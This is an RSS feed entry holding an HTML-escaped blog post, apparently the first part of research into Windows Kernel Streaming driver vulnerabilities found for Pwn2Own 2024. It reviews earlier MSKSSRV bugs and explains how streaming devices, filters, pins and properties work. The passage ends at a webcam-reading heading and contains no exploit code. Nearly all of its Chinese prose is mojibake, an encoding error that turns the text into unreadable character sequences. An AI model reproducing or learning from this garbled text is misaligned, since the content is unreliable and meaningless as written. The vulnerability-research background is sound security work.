                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨éå»çš„å¹¾åå¹´ä¸­ Windows Kernel çš„æ¼æ´å±¤å‡ºä¸çª®ï¼Œç†±é–€çš„æ”»æ“Šé¢é€æ¼¸å¾ Win32k æ…¢æ…¢è½‰ç§»åˆ° CLFS (Common Log File System) ä¸Šã€‚å¾®è»Ÿä¹ŸæŒçºŒä¸”ç©æ¥µåœ°ä¿®è£œé€™äº›æ¼æ´ï¼Œä½¿å¾—é€™äº›å…ƒä»¶è¶Šä¾†è¶Šå®‰å…¨ã€‚è€Œä¸‹ä¸€å€‹ç†±é–€çš„ç›®æ¨™æœƒæ˜¯å“ªå€‹å…ƒä»¶å‘¢ï¼Ÿå»å¹´é–‹å§‹ï¼ŒMSKSSRV (Microsoft Kernel Streaming Service) æˆç‚ºé§­å®¢å–œæ„›çš„ç›®æ¨™ä¹‹ä¸€ã€‚é€™å€‹é©…å‹•ç¨‹å¼å°åˆ°å¯ä»¥åœ¨å¹¾å¤©å…§å®Œæˆåˆ†æã€‚é€™æ˜¯å¦æ„å‘³è‘—å¯èƒ½ä¸å¤ªæœƒæœ‰æ–°çš„æ¼æ´äº†ï¼Ÿ&lt;/p&gt;

&lt;p&gt;åœ¨é€™ç¯‡ç ”ç©¶å°‡è¬›è¿°ä¸€å€‹é•·æœŸè¢«å¿½è¦–çš„æ”»æ“Šé¢ï¼Œè®“æˆ‘å€‘åœ¨å…©å€‹æœˆå…§å°±æ‰¾å‡ºäº†è¶…é 10 å€‹æ¼æ´ã€‚æ­¤å¤–ï¼Œä¹Ÿå°‡æ·±å…¥æ¢è¨äº†ä¸€ç¨® Proxy-Based çš„é‚è¼¯æ¼æ´é¡å‹ï¼Œä½¿æˆ‘å€‘å¯ä»¥å¿½ç•¥æ‰å¤§å¤šæ•¸çš„æª¢æŸ¥ï¼Œæœ€çµ‚æˆåŠŸåœ¨ Pwn2Own Vancouver 2024 ä¸­ï¼Œæ”»ä¸‹ Windows 11 çš„é …ç›®ã€‚&lt;/p&gt;

&lt;p&gt;é€™ä»½ç ”ç©¶å°‡åˆ†æˆæ•¸å€‹éƒ¨åˆ†ä¾†æ’°å¯«ï¼Œåˆ†åˆ¥è¬›è¿°ä¸åŒçš„æ¼æ´é¡å‹åŠæ¼æ´å‹æ…‹ï¼Œäº¦ç™¼è¡¨æ–¼ &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/&quot;&gt;HITCON CMT 2024&lt;/a&gt; ä¸­ã€‚&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;å°æ–¼ä¸€é …æ¼æ´ç ”ç©¶ä¾†èªªï¼Œå¾æ­·å²çš„æ¼æ´çœ‹èµ·ï¼Œæ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;èµ·åˆï¼Œæˆ‘å€‘ç‚ºäº†æŒ‘æˆ° Pwn2Own Vancouver 2024 ä¸­ Windows 11 çš„é …ç›®ï¼Œé–‹å§‹å¾éå»çš„ Pwn2Own ä»¥åŠè¿‘æœŸ in-the-wild çš„æ¼æ´ä¸­é–‹å§‹å¯©è¦–ï¼Œå°‹æ‰¾å¯èƒ½çš„æ”»æ“Šé¢ã€‚æ²¿è‘—æ­·å²è»Œè·¡å¯ä»¥å¾—çŸ¥ï¼Œéå»ä¸»è¦è² è²¬ GDI ç›¸é—œæ“ä½œçš„ Win32K ä¸€ç›´æ˜¯å€‹å¾ˆç†±é–€çš„ç›®æ¨™ï¼Œå¾ 2018 å¹´ä»¥ä¾†ï¼ŒCLFS (Common Log File System) ä¹Ÿæ¼¸æ¼¸æˆç‚ºäº†ç†±é–€ç›®æ¨™ä¹‹ä¸€ã€‚é€™å…©å€‹å…ƒä»¶éƒ½éå¸¸è¤‡é›œï¼Œä¸¦ä¸”ç›´åˆ°ç¾åœ¨ä»ç„¶æœ‰ä¸å°‘æ–°æ¼æ´å‡ºç¾ï¼Œä½†è¦ç†Ÿæ‚‰é€™å…©å€‹å…ƒä»¶éœ€è¦èŠ±ä¸å°‘æ™‚é–“ï¼ŒåŒæ™‚ä¹Ÿæœ‰è¨±å¤šç ”ç©¶å“¡åœ¨çœ‹é€™å…©å€‹å…ƒä»¶ï¼Œæ‰€ä»¥æœ€çµ‚æˆ‘å€‘æ²’æœ‰å…ˆé¸æ“‡åˆ†æä»–å€‘ã€‚&lt;/p&gt;

&lt;p&gt;å»å¹´ &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; åœ¨ Pwn2Own 2023 ä¸­ï¼Œä½¿ç”¨ MSKSSRV çš„&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;æ¼æ´&lt;/a&gt;æˆåŠŸæ”»ä¸‹ Windows 11 å¾Œï¼Œä¾¿æœ‰ä¸å°‘äººå¾€é€™å€‹å…ƒä»¶é–‹å§‹çœ‹èµ·ï¼ŒçŸ­æ™‚é–“å…§å°±åˆå‡ºç¾äº†&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;ç¬¬äºŒå€‹æ¼æ´ CVE-2023-36802&lt;/a&gt;ï¼Œé€™æ™‚ &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; ä¹Ÿç™¼è¡¨äº†ä¸€ç¯‡&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;éå¸¸è©³ç´°çš„æ–‡ç« &lt;/a&gt;ï¼Œè¬›è¿°é€™å€‹æ¼æ´æˆå› åŠå…¶åˆ©ç”¨ç´°ç¯€ã€‚ç”±æ–¼é€™å€‹å…ƒä»¶éå¸¸çš„å°ï¼Œåªçœ‹æª”æ¡ˆå¤§å°ç´„ç•¥åªæœ‰ 72 KBï¼Œå¯èƒ½èªçœŸçœ‹å€‹å¹¾å¤©å°±å¯ä»¥å…¨éƒ¨çœ‹å®Œï¼Œå› æ­¤æˆ‘å€‘ä¾¿æŒ‘äº† MSKSSRV ä¾†åšæ­·å²æ¼æ´åˆ†æï¼Œçœ‹çœ‹æ˜¯å¦æœ‰æ©ŸæœƒæŠ“å‡ºå…¶ä»–æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æˆ‘å€‘æœƒæä¸€ä¸‹é€™å…©å€‹æ¼æ´ï¼Œä½†ä¸æœƒè‘—å¢¨éå¤šã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€å€‹æ˜¯ Synacktiv åœ¨ Pwn2Own 2023 ä¸­æ‰€ä½¿ç”¨çš„æ¼æ´ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹é‚è¼¯ä¸Šçš„æ¼æ´ã€‚ç•¶ MSKSSRV ä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; é–å®šä½¿ç”¨è€…çµ¦çš„è¨˜æ†¶é«”ä½ç½®ä½œç‚º FrameBuffer æ™‚ï¼Œä¸¦æ²’æœ‰è¨­ç½®æ­£ç¢ºçš„ AccessModeï¼Œå°è‡´æ²’æœ‰æª¢æŸ¥ä½¿ç”¨è€…æŒ‡å®šçš„ä½ç½®æ˜¯å¦å±¬æ–¼ User spaceã€‚å¦‚æœä½¿ç”¨è€…çµ¦çš„æ˜¯ Kernel space ä¸­çš„ä½ç½®ï¼Œå®ƒå°±æœƒæŠŠæŒ‡å®šçš„ Kernel ä½ç½®æ˜ å°„åˆ° User space çµ¦ä½¿ç”¨è€…ç”¨ï¼Œæœ€çµ‚å°è‡´ä½¿ç”¨è€…å¯ä»¥å° Kernel ä¸­çš„ä»»æ„ä½ç½®å¯«å…¥ï¼Œåˆ©ç”¨ä¸Šç°¡å–®ä¸”éå¸¸ç©©å®šï¼Œæˆç‚ºäº†å—æ­¡è¿çš„&lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;æ¼æ´ä¹‹ä¸€&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ›´å¤šç´°ç¯€å¯ä»¥åƒè€ƒ Synacktiv åœ¨ HITB 2023 HKT çš„&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;æ¼”è¬›&lt;/a&gt;åŠ &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; çš„&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;éƒ¨è½æ ¼æ–‡ç« &lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;é€™å€‹æ¼æ´å‰‡æ˜¯åœ¨ CVE-2023-29360 å‡ºä¾†å¾Œæ²’å¤šä¹…è¢«è¨±å¤šäººç™¼ç¾ï¼Œä¸¦ä¸”åœ¨å¾®è»Ÿç™¼ä½ˆæ›´æ–°æ™‚ï¼Œå°±å·²ç¶“åµæ¸¬åˆ°åˆ©ç”¨ï¼Œæ˜¯å€‹éå¸¸å®¹æ˜“è¢«ç™¼ç¾çš„æ¼æ´ã€‚MSKSSRV æœƒå…ˆå°‡å…§éƒ¨ä½¿ç”¨çš„ç‰©ä»¶ï¼ˆFSContextRegã€FSStreamRegï¼‰å­˜æ”¾åœ¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object&quot;&gt;FILE_OBJECT&lt;/a&gt; çš„ FsContext2 ä¸­ï¼Œç„¶è€Œå¾ŒçºŒä½¿ç”¨æ™‚ä¸¦æ²’æœ‰å° FsContext2 çš„&lt;strong&gt;å‹æ…‹&lt;/strong&gt;åšæª¢æŸ¥ï¼Œå°è‡´ type confusionï¼Œè©³ç´°å…§å®¹å¯åƒè€ƒ &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force çš„éƒ¨è½æ ¼&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ­¤ä¹‹å¾Œï¼Œå°±å¾ˆå°‘æœ‰é—œæ–¼ MSKSSRV çš„ç›¸é—œæ¼æ´äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;ç„¶è€Œæ˜¯å¦é€™æ¨£å°±æ²’æ´äº†å‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;è€Œæˆ‘è¦æ›´æº–ç¢ºåœ°å›ç­”ï¼ŒNo!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å¯¦éš›ä¸Šæ•´å€‹ Kernel Streaming å°±åƒä¸‹é¢é€™å¼µåœ–é€™æ¨£ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV åªæ˜¯å†°å±±ä¸€è§’è€Œå·²ï¼Œå¯¦éš›ä¸Šé‚„æœ‰ä¸å°‘æ½›åœ¨çš„å…ƒä»¶ï¼Œä¸Šåœ–ä¸­æ‰€å¯«çš„éƒ½æ˜¯å±¬æ–¼ Kernel Streaming çš„ä¸€éƒ¨åˆ†ã€‚å¯¦éš›å¾€é€™æ–¹å‘æŒ–æ˜ä¹‹å¾Œï¼Œæœ€çµ‚ä¹Ÿåœ¨é€™å€‹æ”»æ“Šé¢ä¸Šå–å¾—ä¸å°‘æ¼æ´ï¼Œå°±å¦‚åŒæµæ°´èˆ¬çš„æµå‡ºæ¼æ´ä¾†ã€‚
&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é †å¸¶ä¸€æï¼Œæˆ‘åœ¨å¯«é€™ç¯‡éƒ¨è½æ ¼æ™‚ï¼Œchompie ä¹Ÿç™¼è¡¨äº†æœ‰é—œæ–¼ä»–åœ¨ä»Šå¹´ Pwn2Own Vancouver 2024 ä¸­æ‰€ä½¿ç”¨çš„æ¼æ´ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;ã€‚é€™å€‹æ¼æ´ä¹Ÿåœ¨ MSKSSRV ä¸­ï¼Œè©²æ¼æ´ç™¼ç”Ÿåœ¨ Reference Count çš„è™•ç†ï¼Œå…¶æˆå› ä¹Ÿå¾ˆæœ‰è¶£ï¼Œä¸éé€™é‚Šå°±ä¸å¤šè«‡ï¼Œè©³ç´°å…§å®¹å¯åƒè€ƒå¥¹&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;ç™¼è¡¨çš„æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;é‚£éº¼ï¼Œä»€éº¼æ˜¯ Kernel Streaming å‘¢ï¼Ÿ äº‹å¯¦ä¸Šï¼Œæˆ‘å€‘æ­£å¸¸ä½¿ç”¨é›»è…¦æƒ…æ³ä¸‹å°±æœƒç”¨åˆ° :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Windows ç³»çµ±ä¸Šï¼Œç•¶æˆ‘å€‘æ‰“é–‹é¡é ­ã€é–‹å•ŸéŸ³æ•ˆä»¥åŠéº¥å…‹é¢¨ç­‰éŸ³è¨Šè¨­å‚™æ™‚ï¼Œç³»çµ±éœ€è¦å¾é€™äº›è¨­å‚™è®€å–ä½ çš„è²éŸ³ã€å½±åƒç­‰ç›¸é—œè³‡æ–™åˆ° RAM ä¸­ã€‚ç‚ºäº†æ›´é«˜æ•ˆåœ°å®Œæˆé€™äº›è³‡æ–™çš„å‚³è¼¸ï¼Œå¾®è»Ÿæä¾›äº†ä¸€å€‹åç‚º &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; çš„æ¡†æ¶ï¼Œç”¨ä¾†è™•ç†é€™äº›è³‡æ–™ã€‚&lt;strong&gt;é€™å€‹æ¡†æ¶ä¸»è¦åœ¨ Kernel mode ä¸‹é‹è¡Œ&lt;/strong&gt;ï¼Œå…·æœ‰ä½å»¶é²ã€è‰¯å¥½çš„æ“´å……æ€§å’Œçµ±ä¸€ä»‹é¢ç­‰ç‰¹æ€§ï¼Œä½¿ä½ èƒ½æ›´æ–¹ä¾¿ã€æ›´é«˜æ•ˆåœ°è™•ç†ä¸²æµï¼ˆStreamï¼‰è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;Kernel Streaming ä¸­ï¼Œæä¾›äº†ä¸‰ç¨®å¤šåª’é«”é©…å‹•æ¨¡å‹ï¼šport classã€AVStream å’Œ stream classã€‚é€™è£¡å°‡ä¸»è¦ä»‹ç´¹ port class å’Œ AVStreamï¼Œè€Œ stream class å› ç‚ºè¼ƒç‚ºç½•è¦‹ä¸”éæ™‚ï¼Œä¸æœƒå¤šåŠ è¨è«–ã€‚&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port Class&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;å¤§å¤šæ•¸ç”¨æ–¼ PCI å’Œ DMA å‹éŸ³æ•ˆè£ç½®çš„ç¡¬é«”é©…å‹•ç¨‹å¼ï¼Œå®ƒè™•ç†èˆ‡éŸ³è¨Šç›¸é—œçš„æ•¸æ“šå‚³è¼¸ï¼Œä¾‹å¦‚éŸ³é‡æ§åˆ¶ã€éº¥å…‹é¢¨è¼¸å…¥ç­‰ç­‰ï¼Œä¸»è¦æœƒä½¿ç”¨åˆ°çš„å…ƒä»¶å‡½å¼åº«æœƒæ˜¯ portcls.sysã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;AVStream å‰‡æ˜¯ç”±å¾®è»Ÿæä¾›çš„å¤šåª’é«”é¡é©…å‹•ç¨‹å¼ï¼Œä¸»è¦æ”¯æ´åƒ…é™å½±ç‰‡çš„ä¸²æµå’Œæ•´åˆéŸ³è¨Š/å½±ç‰‡ä¸²æµï¼Œç›®å‰è·Ÿå½±åƒæœ‰é—œçš„è™•ç†å¤šæ•¸éƒ½è·Ÿé€™é¡åˆ¥æœ‰é—œï¼Œä¾‹å¦‚ä½ çš„è¦–è¨Šé¡é ­ã€æ“·å–å¡ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¯¦éš›ä¸Š Kernel Streaming çš„ä½¿ç”¨å¾ˆè¤‡é›œï¼Œå› æ­¤é€™è£¡åªæœƒç°¡å–®çš„æ•˜è¿°ä¸€ä¸‹ï¼Œæ›´å¤šè©³ç´°å…§å®¹å¯ä»¥åƒè€ƒ&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;å¾®è»Ÿå®˜æ–¹æ–‡ä»¶&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;
&lt;p&gt;åœ¨æˆ‘å€‘æƒ³è¦èˆ‡éŸ³è¨Šè¨­å‚™æˆ–æ˜¯è¦–è¨Šé¡é ­ç­‰è¨­å‚™äº’å‹•æ™‚è©²æ€éº¼åšå‘¢ï¼Ÿå…¶å¯¦å°±è·Ÿä¸€èˆ¬è¨­å‚™äº’å‹•ä¸€æ¨£ï¼Œå¯ä»¥é€é CreateFile å‡½æ•¸ä¾†é–‹å•Ÿä¸€å€‹è¨­å‚™ã€‚é‚£éº¼é€™é¡å‹çš„è¨­å‚™ï¼Œåç¨±åˆæœƒæ˜¯ç”šéº¼å‘¢ï¼Ÿå…¶å¯¦é€™é‚Šä¸å¤ªæœƒåƒæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Devcie\NamedPipe&lt;/code&gt; é€™é¡å‹çš„åç¨±ï¼Œè€Œæ˜¯æœƒåƒä¸‹é¢é€™æ¨£çš„è·¯å¾‘ :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;æ¯å°é›»è…¦éƒ½å¯èƒ½ä¸ä¸€æ¨£ï¼Œå¿…é ˆä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; ç­‰ API å»åˆ—èˆ‰è¨­å‚™ï¼Œä¸€èˆ¬ä¾†èªª KS ç³»åˆ—çš„è¨­å‚™éƒ½æœƒè¨»å†Šåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt; åº•ä¸‹ï¼Œåƒæ˜¯éŸ³è¨Šè¨­å‚™å°±æœƒè¨»å†Šåœ¨ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt; ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ KS æ‰€æä¾›çš„ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt; ç²å¾—è©²é¡åˆ¥ä¸­ç¬¬ä¸€å€‹ç¬¦åˆçš„ PnP è£ç½®çš„ Handleï¼Œå¯¦éš›ä¸Šä¾†èªªä¹Ÿåªæ˜¯ SetupDiGetClassDevs å’Œ CreateFile çš„å°è£è€Œå·²ã€‚&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘åœ¨é–‹å•Ÿé€™äº›è¨­å‚™ä¹‹å¾Œï¼ŒKernel Streaming æœƒåœ¨ Kernel ä¸­å»ºç«‹ä¸€äº›ç›¸é—œçš„ Instanceï¼Œå…¶ä¸­æœ€ç‚ºé‡è¦çš„å°±æ˜¯ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; åŠ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;ã€‚åœ¨ Kernel Streaming çš„ä½¿ç”¨éç¨‹ä¸­ï¼Œé€™äº› Instance æœƒè¢«é »ç¹ä½¿ç”¨ï¼Œå®ƒå€‘ä¸»è¦ç”¨ä¾†å°è£è¨­å‚™çš„ç¡¬é«”åŠŸèƒ½ï¼Œæ–¹ä¾¿é–‹ç™¼è€…é€éçµ±ä¸€çš„ä»‹é¢é€²è¡Œä¸²æµçš„è™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šå…ˆä»¥ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;Audio Filters&lt;/a&gt; ä½œç‚ºä¾‹å­ï¼Œå…¶ä»–å¤šæ•¸å¤§åŒå°ç•°ï¼Œæˆ‘å€‘ä¹Ÿåªæœƒç°¡å–®ä»‹ç´¹ï¼Œå…¶ä»–ç´°ç¯€è«‹è‡ªè¡Œåƒè€ƒå¾®è»Ÿå®˜æ–¹æ–‡ä»¶ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;æ¯å€‹ KS Filter é€šå¸¸ä»£è¡¨ä¸€å€‹è¨­å‚™æˆ–è¨­å‚™çš„ç‰¹å®šåŠŸèƒ½ï¼Œåœ¨æˆ‘å€‘æ‰“é–‹ä¸€å€‹éŸ³è¨Šè¨­å‚™å¾Œï¼Œå¤§éƒ¨åˆ†æƒ…æ³ä¸‹æœƒå°æ‡‰åˆ°ä¸€å€‹ Kernel Filterï¼Œç•¶æˆ‘å€‘å¾éŸ³è¨Šè¨­å‚™è®€å–è³‡æ–™æ™‚ï¼Œé€™äº›è³‡æ–™å°±æœƒå…ˆé€šéé€™å€‹ KS Filter é€²è¡Œè™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;æ¦‚å¿µä¸Šå¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œä¸­é–“çš„å¤§æ¡†è¡¨ç¤ºä¸€å€‹ä»£è¡¨éŸ³è¨Šè¨­å‚™çš„ KS filterã€‚è€Œæˆ‘å€‘æƒ³è¦å¾éŸ³è¨Šè¨­å‚™ä¸­è®€å–è³‡æ–™æ™‚ï¼Œæœƒå¾å·¦é‚Šè®€å…¥ Filterï¼Œç¶“éå¹¾å€‹ç¯€é»é€²è¡Œè™•ç†å¾Œï¼Œå¾å³é‚Šè¼¸å‡ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;ä¸Šåœ–ä¸­ï¼Œè®€å–åŠè¼¸å‡ºè³‡æ–™çš„é»ç¨±ç‚º Pinï¼ŒKernel ä¹Ÿæœ‰ç›¸å°æ‡‰çš„ KS Pin Objectï¼Œç”¨æ–¼æè¿°é€™äº› Pin çš„è¡Œç‚ºï¼Œä¾‹å¦‚ Pin æ˜¯è¼¸å…¥ç«¯é‚„æ˜¯è¼¸å‡ºç«¯ã€æ”¯æ´çš„æ ¼å¼æœ‰å“ªäº›ç­‰ã€‚æˆ‘å€‘ä½¿ç”¨æ™‚å¿…é ˆåœ¨ Filters ä¸Šï¼Œ&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;é–‹å•Ÿä¸€å€‹ Pin&lt;/a&gt; ä¾†å»ºç«‹ Instanceï¼Œæ‰èƒ½å¾è¨­å‚™è®€å–æˆ–è¼¸å‡ºè³‡æ–™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS Property&lt;/h3&gt;
&lt;p&gt;é€™äº› KS Object éƒ½æœƒæœ‰è‡ªå·±çš„ Propertyï¼Œæ¯å€‹ Property éƒ½æœƒæœ‰ç›¸å°æ‡‰çš„åŠŸèƒ½ï¼Œå‰é¢æ‰€æåˆ°çš„ Pin ä¸­çš„è³‡æ–™æ ¼å¼ã€éŸ³é‡å¤§å°åŠè¨­å‚™çš„ç‹€æ…‹ç­‰ç­‰ï¼Œé€™äº›éƒ½æ˜¯ä¸€å€‹ Propertyï¼Œé€šå¸¸æœƒå°æ‡‰åˆ°ä¸€çµ„ GUIDï¼Œæˆ‘å€‘å¯ä»¥é€é &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt; ä¾†è®€å–æˆ–è¨­å®šé€™äº› Propertyã€‚&lt;/p&gt;

&lt;p&gt;é€™å¤§å¤§ç°¡åŒ–äº†å¤šåª’é«”é©…å‹•ç¨‹å¼çš„é–‹ç™¼ï¼Œä¸¦ä¸”ç¢ºä¿äº†ä¸åŒè¨­å‚™ä¹‹é–“çš„ä¸€è‡´æ€§å’Œå¯æ“´å±•æ€§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
